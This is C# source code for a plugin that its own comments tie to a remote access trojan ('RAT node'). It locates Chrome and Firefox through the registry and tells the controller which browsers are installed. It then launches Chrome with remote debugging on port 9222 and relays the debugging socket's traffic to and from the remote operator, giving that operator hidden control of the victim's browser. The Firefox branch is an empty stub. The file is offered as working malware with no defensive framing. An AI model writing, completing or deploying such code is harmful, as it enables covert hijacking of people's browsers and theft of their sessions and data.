using Microsoft.Win32;
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Text;

namespace Plugin
{
    public class Main
    {
        // Get path to Chrome executable
        public string GetChromeExePath()
        {
            try
            {
                var path = Registry.GetValue("HKEY_CLASSES_ROOT\\ChromeHTML\\shell\\open\\command", null, null) as string;
                if (path != null)
                {
                    var split = path.Split('\"');
                    path = split.Length >= 2 ? split[1] : null;
                }
                return path;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error getting Chrome path: {ex.Message}");
                return null;
            }
        }

        // Get path to Firefox executable
        public string GetFirefoxExePath()
        {
            try
            {
                foreach (string keyname in Registry.ClassesRoot.GetSubKeyNames())
                {
                    if (keyname.Contains("FirefoxHTML"))
                    {
                        var path = Registry.GetValue($"HKEY_CLASSES_ROOT\\{keyname}\\shell\\open\\command", null, null) as string;
                        if (path != null)
                        {
                            var split = path.Split('\"');
                            path = split.Length >= 2 ? split[1] : null;
                        }
                        return path;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error getting Firefox path: {ex.Message}");
            }
            return null;
        }

        // Method to forward Firefox traffic
        public void ForwardFirefox(Node node, string firefoxPath)
        {
            // Implement Firefox forwarding logic here
        }

        // Method to forward Chrome traffic
        public void ForwardChrome(Node node, string chromePath)
        {
            try
            {
                Console.WriteLine(chromePath);
                Console.WriteLine($"{chromePath} --user-data-dir=C:\\chrome-dev-profile23 --remote-debugging-port=9222");
                Process.Start(chromePath, "--user-data-dir=C:\\chrome-dev-profile23 --remote-debugging-port=9222");

                // Connect to Chrome debugging port
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    Task.Delay(5000).Wait(); // Wait for Chrome to start
                    socket.Connect("localhost", 9222);
                    Console.WriteLine($"Connected to Chrome: {socket.Connected}");

                    // Start send and receive threads
                    Task.Run(() => SendThread(socket, node));
                    RecvThread(socket, node);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error forwarding Chrome traffic: {ex.Message}");
            }
        }

        // Send data from RAT node to socket
        private void SendThread(Socket socket, Node node)
        {
            try
            {
                while (true)
                {
                    byte[] data = node.Receive();
                    Console.WriteLine(Encoding.UTF8.GetString(data));
                    socket.Send(data, data.Length, SocketFlags.None);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending data: {ex.Message}");
            }
        }

        // Receive data from socket and send to RAT node
        private void RecvThread(Socket socket, Node node)
        {
            try
            {
                while (true)
                {
                    byte[] bits = new byte[1];
                    socket.Receive(bits, bits.Length, SocketFlags.None);
                    Console.WriteLine(Encoding.UTF8.GetString(bits));
                    node.Send(bits);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error receiving data: {ex.Message}");
            }
        }

        // Main method to run the plugin
        public async Task Run(Node node)
        {
            try
            {
                node.Send(new byte[] { 3 }); // Indicate connection

                // Check available browsers
                string chromePath = GetChromeExePath();
                string firefoxPath = GetFirefoxExePath();
                byte[] availableBrowsers = { chromePath != null ? (byte)1 : (byte)0, firefoxPath != null ? (byte)1 : (byte)0 };
                node.Send(availableBrowsers);

                // Receive browser choice and forward traffic accordingly
                byte[] browserChoice = node.Receive();
                if (browserChoice[0] == 1 && chromePath != null)
                {
                    ForwardChrome(node, chromePath);
                }
                else if (browserChoice[0] == 2 && firefoxPath != null)
                {
                    ForwardFirefox(node, firefoxPath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error running plugin: {ex.Message}");
            }
        }
    }
}
